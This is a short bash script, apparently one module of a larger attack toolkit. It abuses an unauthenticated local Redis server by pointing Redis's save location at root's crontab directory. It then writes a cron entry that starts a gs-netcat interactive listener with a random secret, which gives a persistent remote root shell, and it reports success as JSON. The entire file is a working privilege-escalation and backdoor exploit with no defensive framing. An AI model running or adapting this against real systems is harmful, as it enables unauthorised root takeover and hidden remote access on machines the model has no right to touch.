#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="redis"
info "Checking Redis..."
nc -z 127.0.0.1 6379 2>/dev/null || { result_json "$METHOD" "skip" "Redis not running"; exit 1; }
redis_info=$(redis-cli -h 127.0.0.1 INFO 2>/dev/null|head -5)
[ -z "$redis_info" ] && { result_json "$METHOD" "skip" "Redis requires auth"; exit 1; }
# Write SSH key or cron
redis-cli -h 127.0.0.1 CONFIG SET dir /var/spool/cron/crontabs 2>/dev/null
secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
redis-cli -h 127.0.0.1 CONFIG SET dbfilename root 2>/dev/null
redis-cli -h 127.0.0.1 SET x "\n* * * * * gs-netcat -s $secret -l -i &\n" 2>/dev/null
redis-cli -h 127.0.0.1 SAVE 2>/dev/null && { result_json "$METHOD" "success" "Cron written" "$secret"; exit 0; }
result_json "$METHOD" "fail" "Redis exploit failed"; exit 1
